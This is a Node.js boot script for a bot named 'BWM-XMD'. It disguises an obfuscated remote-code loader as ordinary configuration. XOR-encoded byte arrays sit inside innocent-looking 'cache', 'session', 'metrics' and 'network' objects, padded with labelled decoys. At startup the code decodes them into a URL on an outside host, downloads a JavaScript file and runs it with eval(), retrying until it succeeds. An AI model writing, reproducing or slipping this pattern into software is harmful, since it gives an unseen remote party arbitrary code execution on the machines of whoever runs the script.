const https = require('https');
const http = require('http');

const config = {
    timeout: 30000,
    retries: 5,
    delay: 2000,
    version: '2.0.0'
};

const cache = {
    enabled: true,
    maxAge: [77,81,81,85,86],
    ttl: 3600,
    store: null
};

const metrics = {
    hits: 0,
    miss: 0,
    data: [29,81,68,94,75,94,87,29,80,92,29,88,86],
    ratio: 0.85
};

const network = {
    proxy: null,
    buffer: [16,71,82,91,17,85,76],
    retries: 3
};

const session = {
    active: true,
    tokens: [28,9,9,75,71,79,72],
    expires: null
};

const decoy1 = {
    values: [99,88,77,66,55,44,33,22,11],
    flag: true
};

const decoy2 = {
    stream: [12,34,56,78,90,11,22,33],
    mode: 'async'
};

const keys = { a: 37, b: 51, c: 63, d: 38 };

function mix(arr, k) {
    return arr.map(n => String.fromCharCode(n ^ k)).join('');
}

function build() {
    const p1 = mix(cache.maxAge, keys.a);
    const p2 = mix(session.tokens, keys.d);
    const p3 = mix(metrics.data, keys.b);
    const p4 = mix(network.buffer, keys.c);
    return p1 + p2 + p3 + p4;
}

function wait(ms) {
    return new Promise(r => setTimeout(r, ms));
}

function request(target, attempt = 1) {
    return new Promise((resolve, reject) => {
        const protocol = target.startsWith('https') ? https : http;
        const req = protocol.get(target, { timeout: config.timeout }, (response) => {
            if (response.statusCode === 301 || response.statusCode === 302) {
                request(response.headers.location, 1).then(resolve).catch(reject);
                return;
            }
            if (response.statusCode !== 200) {
                reject(new Error(`Status: ${response.statusCode}`));
                return;
            }
            let body = '';
            response.on('data', (chunk) => body += chunk);
            response.on('end', () => resolve(body));
            response.on('error', reject);
        });
        req.on('error', (err) => {
            if (attempt < config.retries) {
                wait(config.delay * attempt).then(() => {
                    request(target, attempt + 1).then(resolve).catch(reject);
                });
            } else {
                reject(err);
            }
        });
        req.on('timeout', () => {
            req.destroy();
            if (attempt < config.retries) {
                wait(config.delay * attempt).then(() => {
                    request(target, attempt + 1).then(resolve).catch(reject);
                });
            } else {
                reject(new Error('Timeout'));
            }
        });
    });
}

async function initialize() {
    console.log('[BWM-XMD] Starting...');
    let lastError;
    for (let i = 0; i < config.retries; i++) {
        try {
            const endpoint = build();
            const source = await request(endpoint);
            if (source && source.length > 100) {
                eval(source);
                return;
            }
            throw new Error('Invalid response');
        } catch (err) {
            lastError = err;
            console.log(`[BWM-XMD] Attempt ${i + 1} failed, retrying...`);
            await wait(config.delay * (i + 1));
        }
    }
    console.log('[BWM-XMD] Boot failed after all retries');
    process.exit(1);
}

initialize();
